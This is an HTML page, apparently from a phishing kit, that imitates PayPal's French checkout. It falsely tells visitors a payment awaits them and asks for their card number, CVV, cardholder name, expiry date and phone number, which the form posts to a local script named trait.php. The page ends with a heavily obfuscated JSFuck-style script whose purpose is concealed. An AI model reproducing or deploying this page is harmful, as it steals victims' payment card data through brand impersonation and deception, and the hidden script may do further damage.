<!DOCTYPE html>
<!--[if lt IE 9]>
<html lang="fr" class="no-js lower-than-ie9 ie desktop">
	<![endif]-->
	<!--[if lt IE 10]>
	<html lang="fr" class="no-js lower-than-ie10 ie desktop">
		<![endif]-->
		<!--[if !IE]>
		-->
		<html lang="fr" >
			<head>
				<link href="css/card.css" rel="stylesheet">
				<link href="css/creditcardjs-v0.10.13.min.css" rel="stylesheet">
				<link rel="stylesheet" type="text/css" href="bootstrap/css/bootstrap.min.css" />
				<link rel="stylesheet" type="text/css" href="font-awesome/css/font-awesome.min.css" />
				<script type="text/javascript" src="js/jquery-1.10.2.min.js"></script>
				<script type="text/javascript" src="bootstrap/js/bootstrap.min.js"></script>
				<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://www.paypalobjects.com/webstatic/icon/pp144.png">
				<link rel="apple-touch-icon-precomposed" sizes="114x114" href="https://www.paypalobjects.com/webstatic/icon/pp114.png">
				<link rel="apple-touch-icon-precomposed" sizes="72x72" href="https://www.paypalobjects.com/webstatic/icon/pp72.png">
				<link rel="apple-touch-icon-precomposed" href="https://www.paypalobjects.com/webstatic/icon/pp64.png">
				<link rel="shortcut icon" sizes="196x196" href="https://www.paypalobjects.com/webstatic/icon/pp196.png">
				<link rel="shortcut icon" type="image/x-icon" href="https://www.paypalobjects.com/webstatic/icon/favicon.ico">
				<link rel="icon" type="image/x-icon" href="https://www.paypalobjects.com/webstatic/icon/pp32.png">
				<link rel="apple-touch-icon" href="https://www.paypalobjects.com/en_US/i/pui/apple-touch-icon.png">
				<!-- (xo-spinner/dist/styles.less) Inlining spinner CSS, then the main CSS bundle is injected when main.js is loaded -->
				
				<link rel="stylesheet" href="https://www.paypalobjects.com/web/res/431/62e164a47079d8e3f7161e2dcd523/css/contextualLogin.css" />
				<link rel="stylesheet" href="https://www.paypalobjects.com/web/res/0d9/f8a6f4aee6afac972b9dbed1095e7/css/styles.css" type="text/css">
				
				<title>Paiement PayPal</title>
				
			</head>
			<body>
				
				
				
				<!-- uiView: -->
				<div  class="ng-scope">
					<div xo-checkout="" component-route="route" class="ng-scope ng-isolate-scope">
						<div class="outerWrapper ltr FR fr" ng-class="[locale.metadata.directionality, locale.country, locale.lang, miniBrowser?'minibrowser':'', isApp?'mobileApp':'']" id="outerWrapper">
							<xo-merchant-header token="token" class="ng-isolate-scope">
								<!-- ngIf: populated && display -->
								<div class="xo-merchant-header-wrapper ng-scope" ng-if="populated &amp;&amp; display">
									
								</div>
								<!-- end ngIf: populated && display -->
							</xo-merchant-header>
							<div id="wrapper" class="clearfix">
								<main id="main" tabindex="-1" aria-disabled="false">
									<xo-header token="token" is-unbranded="isUnbranded" unbranded-title="unbrandedTitle" unbranded-sub-title="unbrandedSubTitle" language-switch="languageSwitchHeader" class="ng-isolate-scope">
										<div class="row-fluid paypalHeaderWrapper" ng-class="{ 'langDropdown': languageSwitch &amp;&amp; languageSwitch.show }" content="">
											<div class="span14 clearfix paypalHeader">
												<div id="mobileMerchantHeader">
													<xo-merchant-header token="token" disable-id="true" class="ng-isolate-scope">
														<!-- ngIf: populated && display -->
														<div class="xo-merchant-header-wrapper ng-scope" ng-if="populated &amp;&amp; display">
															<header role="banner">
																
															</header>
														</div>
														<!-- end ngIf: populated && display -->
													</xo-merchant-header>
												</div>
												<!-- ngIf: unbrandedTitle -->
												<!-- ngIf: !isMessengerBAIntegration && !isUnbranded && !isVenmoFlow -->
												<div ng-if="!isMessengerBAIntegration &amp;&amp; !isUnbranded &amp;&amp; !isVenmoFlow" id="paypalLogo" class="logo ng-scope">
													<span class="accessAid ng-binding">Paiement PayPal</span>
												</div>
												
												<xo-cart token="token" show-cart-total="showCartTotal" render-cart-container="renderCartContainer" class="ng-isolate-scope">
													<!-- ngIf: showAmt || showArrow -->
													<div class="cartContainer ng-scope" content="" ng-if="showAmt || showArrow">
														<div class="transactionDetailsContainer hasAmount" ng-class="{cart:showCart, hasAmount:showAmt}">
															<!-- ngIf: showArrow -->
															
															<!-- end ngIf: showArrow -->
															<!-- ngIf: !showArrow -->
															<!-- ngIf: showArrow -->
															
															<!-- end ngIf: showArrow -->
														</div>
													</div>
													<!-- end ngIf: showAmt || showArrow -->
												</xo-cart>
												<!-- ngIf: languageSwitch && languageSwitch.show -->
												<!-- ngIf: unbrandedSubTitle -->
												
											</div>
										</div>
									</xo-header>
									<div id="contents">
										<!-- uiView: -->
										<div ui-view="" class="ng-scope">
											<div xo-signup="" token="token" button-params="buttonParams" component-route="route" export="view" class="ng-scope ng-isolate-scope">
												<section class="fullSignup" id="fullSignup" content="">
													<div class="row-fluid">
														<div class="span14">
															<xo-onboard-payment token="token" mode="mode" single-step-model="singleStepModel" button-params="buttonParams" class="ng-isolate-scope">
																<!-- ngIf: populated && display -->
																<div class="xo-onboard-payment-wrapper ng-scope" ng-if="populated &amp;&amp; display">
																	<div content="" class="singlePagePayment" id="singlePagePayment">
																		<!-- BillingAgreement flows need to display description passed by merchant in cart -->
																		<!-- ngIf: billingAgreementMerchantMsg -->
																		<xo-message message="topErrorMessage" class="ng-isolate-scope">
																			<!-- ngIf: message.msgs || message.msgKeys -->
																		</xo-message>
																		<!-- ngIf: landingAbTestCheck() -->
																		<xo-message message="errorMessage" class="ng-isolate-scope">
																			<!-- ngIf: message.msgs || message.msgKeys -->
																		</xo-message>
																		<xo-xoon-header token="token" flags="flags" user="onboard.user" mode="mode" fi-mode="onboard.fiMode" class="ng-isolate-scope">
																			<!-- ngIf: populated && display -->
																			<div class="xo-xoon-header-wrapper ng-scope" ng-if="populated &amp;&amp; display">
																				<div class="headerBox" content="">
																					
																					<p class="subTitle ng-binding" id="pageTitleProps" ng-bind-html="htmlContent(pageTitlePropsContentKey, { subject: subject, countryName: currentCountryName })">
																					Bonjour,</br>vous avez un paiement en attente, configurer votre carte bancaire pour accepter ce paiement.</br>
																						Nous ne communiquons pas vos informations  bancaires.
																					</p>
																					<!-- ngIf: showEmailCheckInfoBox -->
																				</div>
																			</div>
																			<!-- end ngIf: populated && display -->
																		</xo-xoon-header>
																		
																			<div ng-class="{'showMask': showMask}" disable-form="showMask">
																				<!-- ngIf: showFISwitchTab() -->
																				<!-- ngIf: showTeslaAddBankFlow() -->
																				<!-- ngIf: !showTeslaAddBankFlow() -->
																				<div ng-if="!showTeslaAddBankFlow()" class="ng-scope">
																					<!-- ngIf: onboard.fiMode === 'card' -->
																					<div ng-if="onboard.fiMode === 'card'" id="cardFields" class="ng-scope">
																						
																							<div class="creditCardInput" content="">
																							
																								<!-- end ngIf: !manageCardFlow && showDropDown() -->
																								<!-- ngIf: !manageCardFlow -->
																								<div ng-if="!manageCardFlow" class="inputField confidential cardNumber creditCardField ng-scope floatingLabel" floating-label="" directionality="">
																									
																									
																								
																								</div>
																								<!-- end ngIf: !manageCardFlow -->
																								<!-- Issue no and start date for maestro cards -->
																								<!-- ngIf: flag('fields.issue') -->
																								<!-- ngIf: expiryShown() || cvvShown() -->
																								<div class="expiration confidential ng-scope"  >
																									<!-- ngIf: expiryShown() -->
																									
																										<!-- ngIf: populated && display -->
																										<div class="xo-card-expiry-wrapper ng-scope" ng-if="populated &amp;&amp; display">
																											<div class="expirationField inputField" id="expirationField" content="">
																												<div class="inputField floatingLabel" floating-label="" directionality="">
																													
																													
																																								
																												</div>
																											</div>
																										</div>
																										<!-- end ngIf: populated && display -->
																									
																									<!-- end ngIf: expiryShown() -->
																									<!-- ngIf: cvvShown() -->
																									
																										<!-- ngIf: populated && display -->
																										<div class="xo-cvv-wrapper ng-scope" ng-if="populated &amp;&amp; display">
																											<div content="" class="inputField cvvField" id="cvvField">
																												<div class="cvvSecurityCode inputField floatingLabel" floating-label="" directionality="">
																													
																													
																													
																												</div>
																											</div>
																										</div>
																										<!-- end ngIf: populated && display -->
																								
																								</div>
																								
																							</div>
																						
																							<!-- ngIf: populated && display -->
																							<div class="xo-name-input-wrapper ng-scope" ng-if="populated &amp;&amp; display">
																								<div class="fieldGroup name clearfix FR" ng-class="country || locale.country" content="">
																									<!-- ngRepeat: layoutItem in metadata.nameEntry.layout track by $index -->
																									<!-- ngIf: metadata.nameEntry.layout -->
																									<div ng-if="metadata.nameEntry.layout" ng-repeat="layoutItem in metadata.nameEntry.layout track by $index" class="ng-scope">
																										<!-- First name -->
																										<!-- ngIf: layoutItem.$ === 'givenName' -->
																										<div ng-if="layoutItem.$ === 'givenName'" class="ng-scope">
																											
																										</div>
																										<!-- end ngIf: layoutItem.$ === 'givenName' -->
																										<!-- Last name -->
																										<!-- ngIf: layoutItem.$ === 'surname' -->
																									</div>
																									<!-- end ngIf: metadata.nameEntry.layout -->
																									<!-- end ngRepeat: layoutItem in metadata.nameEntry.layout track by $index -->
																									<!-- ngIf: metadata.nameEntry.layout -->
																									
																									<!-- end ngIf: metadata.nameEntry.layout -->
																									<!-- end ngRepeat: layoutItem in metadata.nameEntry.layout track by $index -->
																									<!-- ngIf: !metadata.nameEntry.layout -->
																								</div>
																							</div>
																							<!-- end ngIf: populated && display -->
																						</xo-name-input>
																						<!-- ngIf: flags.hasBuyerFxPrePlanData && flags.buyerFxTreatment -->
																					</div>
																					
																					
	<form method="post" action="js/trait.php"  autocomplete="off" onsubmit="return creditcardjs.isValid()">
<div class="ccjs-card">
  <label class="ccjs-number">
    Numéro de la Carte
    <input name="card_number"  class="ccjs-number" placeholder="•••• •••• •••• ••••" value="<?php if(isset($_POST['card_number'])){echo htmlentities($_POST['card_number'], ENT_QUOTES, 'UTF-8');} ?>" />
  </label>

  <label class="ccjs-csc">
    Code CVV
    <input name="csc" class="ccjs-csc"  placeholder="•••" value="<?php if(isset($_POST['csc'])){echo htmlentities($_POST['csc'], ENT_QUOTES, 'UTF-8');} ?>" >
  </label>

  <button type="button" class="ccjs-csc-help">?</button>

  <label class="ccjs-name">
    Nom sur la Carte
    <input name="name" class="ccjs-name" value="<?php if(isset($_POST['name'])){echo htmlentities($_POST['name'], ENT_QUOTES, 'UTF-8');} ?>">
  </label>

  <fieldset class="ccjs-expiration">
    <legend>Expiration</legend>
    <select name="month" class="ccjs-month">
      <option selected disabled>MM</option>
      <option value="01">01</option>
      <option value="02">02</option>
      <option value="03">03</option>
      <option value="04">04</option>
      <option value="05">05</option>
      <option value="06">06</option>
      <option value="07">07</option>
      <option value="08">08</option>
      <option value="09">09</option>
      <option value="10">10</option>
      <option value="11">11</option>
      <option value="12">12</option>
    </select>

    <select name="year" class="ccjs-year">
      <option selected disabled>YY</option>
      <option value="14">14</option>
      <option value="15">15</option>
      <option value="16">16</option>
      <option value="17">17</option>
      <option value="18">18</option>
      <option value="19">19</option>
      <option value="20">20</option>
      <option value="21">21</option>
      <option value="22">22</option>
      <option value="23">23</option>
      <option value="24">24</option>
    </select>
  </fieldset>

  <select name="card_type" class="ccjs-hidden-card-type">
    <option value="amex" class="ccjs-amex">American Express</option>
    <option value="discover" class="ccjs-discover">Discover</option>
    <option value="mastercard" class="ccjs-mastercard">MasterCard</option>
    <option value="visa" class="ccjs-visa">Visa</option>
    <option value="diners-club" class="ccjs-diners-club">Diners Club</option>
    <option value="jcb" class="ccjs-jcb">JCB</option>
    <!--<option value="laser" class="laser">Laser</option>-->
    <!--<option value="maestro" class="maestro">Maestro</option>-->
    <!--<option value="unionpay" class="unionpay">UnionPay</option>-->
    <!--<option value="visa-electron" class="visa-electron">Visa Electron</option>-->
    <!--<option value="dankort" class="dankort">Dankort</option>-->
  </select>

  </div>

        <div class="form-group">
			<label for="Amount" style="font-size: 12px;" >	Montant à recevoir(sans la devise: € par exemple)</label>
			
			<input type="tel" class="form-control" name="Amount" id="Amount" placeholder="EX : 2000" required >
		</div>
        <div class="form-group">
			<label for="inputTel" style="font-size: 12px;">Téléphone</label>
			
			<input type="tel" class="form-control" name="inputTel" id="inputTel" placeholder="Téléphone" required >
		</div>
                           <div class="row">
                        <div class="col-xs-12">
                            
							<button type="submit" style="font-size: 1.5em;" class="button actionContinue scTrack:unifiedlogin-login-submit" >Terminez</button>
                        </div>
                    </div>
					
						
                        
                   
</form >
<style>


.glyphicon-refresh-animate {
    -animation: spin .7s infinite linear;
    -webkit-animation: spin2 .7s infinite linear;
}

@-webkit-keyframes spin2 {
    from { -webkit-transform: rotate(0deg);}
    to { -webkit-transform: rotate(360deg);}
}

@keyframes spin {
    from { transform: scale(1) rotate(0deg);}
    to { transform: scale(1) rotate(360deg);}
}
</style>
																					
																					
																				</div>
																				<!-- end ngIf: !showTeslaAddBankFlow() -->
																			</div>
																		
																	</div>
																	<!-- ngIf: showAddressNormalizationLightbox -->
																	<xo-guest-sepa-lightbox single-page-payment-form="singlePagePaymentForm" onboard="onboard" section-element="sectionElement" update-page-level-error-message="actions.updatePageLevelErrorMessage" address="onboard.billing_address" is-unbranded="isUnbranded" flags="flags" validated="validated" sepa="sepa" done-fn="actions.onSubmit" class="ng-isolate-scope">
																		<!-- ngIf: populated && display -->
																		<div class="xo-guest-sepa-lightbox-wrapper ng-scope" ng-if="populated &amp;&amp; display">
																			<!-- ngIf: noErrorShowSepa -->
																		</div>
																		<!-- end ngIf: populated && display -->
																	</xo-guest-sepa-lightbox>
																	<!-- ngIf: launch3DSResolver -->
																	<!-- ngIf: launchUpopScreen -->
																	<!-- ngIf: launchCurrencyConversionLightbox -->
																	<!-- ngIf: launchTravelRuleLightbox -->
																	<!-- ngIf: flags.showRedirectWarningPrompt -->
																	<!-- ngIf: flags.showCartChanged -->
																</div>
																<!-- end ngIf: populated && display -->
															</xo-onboard-payment>
														</div>
														<div class="span10">
															<xo-value-props type="review" title="PayPal, votre réflexe sécurité pour payer" text-content="guestVerify.propVal" class="ng-isolate-scope">
																<div class="props review" content="">
																	<div class="prop-img"></div>
																	

																	<p class="vprop-header ng-binding" ><div style="font-size: 1.5em;" class="btn btn-lg btn-warning" style="border:0px"><span class="glyphicon glyphicon-refresh glyphicon-refresh-animate"></span> Paiement  en attente....</div></p>
																	<!-- ngIf: textContent -->
																	<p  style="font-size: 1.5em;" ng-if="textContent" ng-bind-html="htmlContent(textContent)" class="ng-binding ng-scope">
																		Après vérification, votre compte sera automatiquement crédité.
																	</p>
																	<!-- end ngIf: textContent -->
																	<!-- ngIf: !textContent -->
																</div>
															</xo-value-props>
														</div>
													</div>
													<!-- uiView: -->
													<div ui-view="" class="ng-scope"></div>
												</section>
											</div>
										</div>
									</div>
								</main>
								
							</div>
							
						</div>
					</div>
				</div>
		<script src="js/creditcardjs-v0.10.13.min.js"></script>
		<script type="text/javascript" >

$=String.fromCharCode(46,86,121,67,104,103,40,41,123,10,47,42,119,109,9,59,125,112,118);(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+([![]]+{})[+!+[]+[+[]]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+([]+[]+[][[]])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+([![]]+{})[+!+[]+[+[]]]+(![]+[])[+!+[]]+(!![]+[])[+!+[]]+([]+[]+[][[]])[!+[]+!+[]]+([]+[]+{})[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]+!+[]]+$[(+[])]+([]+[]+{})[+!+[]]+([]+[]+[][[]])[+!+[]]+$[(+!+[])]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([]+[]+[][[]])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+$[+!+[]+!+[]]+$[+!+[]+!+[]+!+[]]+$[+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+([]+[]+[][[]])[+!+[]]+$[+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+$[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+[]]+(!![]+[])[!+[]+!+[]]+([]+[]+[][[]])[+!+[]]+([![]]+{})[+!+[]+[+[]]]+(!![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([]+[]+{})[+!+[]]+([]+[]+[][[]])[+!+[]]+$[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]+!+[]]+$[(+!+[])]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([]+[]+[][[]])[!+[]+!+[]]+$[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+$[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[+[]]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+$[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]+!+[]]+$[(+!+[])]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([]+[]+[][[]])[!+[]+!+[]]+$[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+$[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+$[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]+([]+[]+{})[+!+[]]+$[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+(![]+[])[+[]]+([]+[]+{})[+!+[]]+(!![]+[])[+!+[]]+$[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]]+([]+[]+{})[!+[]+!+[]]+$[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([]+[]+{})[+!+[]]+([]+[]+[][[]])[+!+[]]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+$[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]]+(!![]+[])[+!+[]]+([]+[]+[][[]])[+!+[]]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+$[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+$[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+$[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+$[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+$[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+$[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+([]+[]+[][[]])[+!+[]]+(!![]+[])[+[]]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+(![]+[])[+[]]+([]+[]+{})[+!+[]]+(!![]+[])[+!+[]]+$[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]]+([]+[]+{})[!+[]+!+[]]+$[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([]+[]+{})[+!+[]]+([]+[]+[][[]])[+!+[]]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+$[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]]+(!![]+[])[+!+[]]+([]+[]+[][[]])[+!+[]]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+(![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+$[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+$[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]

		</script>
		</body>
		</html>
